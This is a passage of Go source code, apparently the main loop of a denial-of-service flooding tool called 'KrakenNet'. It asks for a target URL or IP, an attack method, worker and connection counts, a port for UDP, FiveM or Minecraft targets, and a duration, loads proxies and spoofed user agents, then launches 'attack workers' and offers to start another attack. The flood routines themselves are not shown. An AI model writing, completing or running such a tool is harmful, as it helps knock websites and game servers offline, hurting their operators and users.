	fmt.Print(Yellow + "Target (URL or IP): " + Reset)
	rawTarget, _ := reader.ReadString('\n')
	target = strings.TrimSpace(rawTarget)
	if target == "" {
		return
	}
	if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
		target = "https://" + target
	}
	_, hostName, _, _ := parseTarget(target)

	printMenu()

	fmt.Print(Yellow + "Select method: " + Reset)
	mode, _ := reader.ReadString('\n')
	mode = strings.TrimSpace(strings.ToLower(mode))

	fmt.Print(Yellow + "Connections per worker: " + Reset)
	fmt.Scanf("%d\n", &connections)
	fmt.Print(Yellow + "Number of workers: " + Reset)
	fmt.Scanf("%d\n", &workers)
	fmt.Print(Yellow + "Port (UDP/FiveM/Minecraft only, 0 = 443): " + Reset)
	fmt.Scanf("%d\n", &port)
	fmt.Print(Yellow + "Duration (seconds): " + Reset)
	fmt.Scanf("%d\n", &durationSec)

	if connections < 1 {
		connections = 10
	}
	if workers < 1 {
		workers = 10
	}
	if port < 1 {
		port = 443
	}
	if durationSec < 1 {
		durationSec = 30
	}

	atomic.StoreInt64(&totalSuccess, 0)
	atomic.StoreInt64(&totalFail, 0)
	atomic.StoreInt64(&totalBytes, 0)
	atomic.StoreInt64(&totalReq, 0)

	fmt.Println()
	fmt.Println(Cyan + "╔" + strings.Repeat("═", 56) + "╗" + Reset)
	fmt.Println(Cyan + "║" + Reset + "  " + BCyan + "MISSION PARAMETERS" + Reset + strings.Repeat(" ", 36) + Cyan + "║" + Reset)
	fmt.Println(Cyan + "╠" + strings.Repeat("═", 56) + "╣" + Reset)
	mparam("Target", target, BWhite)
	mparam("Method", mode, BYellow)
	mparam("Workers", strconv.Itoa(workers), BWhite)
	mparam("Connections", strconv.Itoa(connections), BWhite)
	mparam("Port", strconv.Itoa(port), BWhite)
	mparam("Duration", strconv.Itoa(durationSec)+" seconds", BWhite)
	mparam("Proxies", strconv.Itoa(len(proxies))+" loaded", BWhite)
	mparam("UserAgents", strconv.Itoa(len(userAgents))+" loaded", BWhite)
	fmt.Println(Cyan + "╚" + strings.Repeat("═", 56) + "╝" + Reset)
	fmt.Println()
	fmt.Println(BGreen + "[+] Deploying attack workers..." + Reset)
	fmt.Println()

	totalDuration := time.Duration(durationSec) * time.Second
	ctx, cancel := context.WithTimeout(context.Background(), totalDuration)
	defer cancel()
	var wg sync.WaitGroup

	attackStart = time.Now()
	go statsReporter(ctx, totalDuration)

	launchWorkers(ctx, &wg, mode, hostName)

	wg.Wait()
	printFinalStats(mode)
}

func main() {
	rand.Seed(time.Now().UnixNano())
	fmt.Print("\033[2J\033[H")
	printBanner()
	reader := bufio.NewReader(os.Stdin)
	for {
		runAttack()
		fmt.Print(Yellow + "\nStart another attack? (y/n): " + Reset)
		again, _ := reader.ReadString('\n')
		again = strings.TrimSpace(strings.ToLower(again))
		if again != "y" {
			fmt.Println(BGreen + "[+] KrakenNet stopped. Goodbye." + Reset)
			break
		}
		fmt.Print("\033[2J\033[H")
		printBanner()
	}
}
